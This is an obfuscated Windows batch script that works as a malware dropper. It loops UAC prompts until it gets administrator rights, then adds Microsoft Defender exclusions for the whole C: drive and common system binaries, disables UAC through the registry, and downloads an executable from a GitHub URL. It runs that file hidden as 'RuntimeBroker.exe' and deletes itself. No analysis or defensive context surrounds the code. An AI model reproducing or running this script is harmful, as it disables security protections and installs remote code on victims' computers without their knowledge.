@echo off & setlocal enableDelayedExpansion
set "kYm=2>&1" & set "kADzG=>nul" & set "GqE=NET" & set "FVwMJ=SESSION"
%GqE% %FVwMJ% %kADzG% %kYm%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "bjkY=bar" & set "fkSE=baz" & set "HeJYG=foo" & set "vzSNi=qux" & rem BwV brJTGg Sze
set "NqpuI=powershell -ExecutionPolicy Bypass -Command"
set "FnE=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "HMugm='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "BZr='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!NqpuI! "!FnE! !HMugm! !BZr!" %kADzG% %kYm%
set "WQq=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "KKL=-Name 'EnableLUA' -Value 0"
!NqpuI! "!WQq! !KKL!" %kADzG% %kYm%
set "BxyMO=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!NqpuI! "!BxyMO!" %kADzG% %kYm%
if !errorlevel! neq 0 (goto %a%)
set "lpwbY=timeout /t" & !lpwbY! 2 %kADzG% %kYm%
set "jheh=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "KWe=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "bKdLM=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!NqpuI! "!jheh! !KWe! !bKdLM!" %kADzG% %kYm%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!lpwbY! 1 %kADzG% %kYm% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %kADzG% %kYm%
del /f /q "%~f0" %kADzG% %kYm%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %kADzG% %kYm%
if !errorlevel! neq 0 (!lpwbY! 3 %kADzG% %kYm% & goto %b%)
exit /b
